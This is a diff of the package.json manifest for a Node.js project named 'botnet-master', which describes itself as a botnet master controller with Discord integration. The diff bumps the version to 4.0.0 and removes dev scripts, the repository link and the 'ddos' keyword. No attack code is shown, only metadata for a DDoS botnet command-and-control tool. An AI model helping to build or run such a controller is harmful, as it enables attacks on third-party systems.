@@ -1,36 +1,20 @@
 {
   "name": "botnet-master",
-  "version": "3.0.0",
-  "description": "Botnet Master Controller with Discord Integration - Hoàn chỉnh",
+  "version": "4.0.0",
+  "description": "Botnet Master Controller - SIÊU ỔN ĐỊNH",
   "main": "master.js",
   "scripts": {
-    "start": "node master.js",
-    "dev": "nodemon master.js",
-    "test": "echo \"No tests specified\" && exit 0"
+    "start": "node master.js"
   },
   "dependencies": {
     "express": "^4.18.2",
     "socket.io": "^4.7.2",
     "discord.js": "^14.14.1"
   },
-  "devDependencies": {
-    "nodemon": "^3.0.1"
-  },
   "engines": {
     "node": ">=18.0.0"
   },
-  "keywords": [
-    "botnet",
-    "ddos",
-    "master",
-    "controller",
-    "discord",
-    "render"
-  ],
+  "keywords": ["botnet", "master", "controller", "discord"],
   "author": "QUÂN HACKER",
-  "license": "MIT",
-  "repository": {
-    "type": "git",
-    "url": "https://github.com/yourusername/botnet-master"
-  }
+  "license": "MIT"
 }
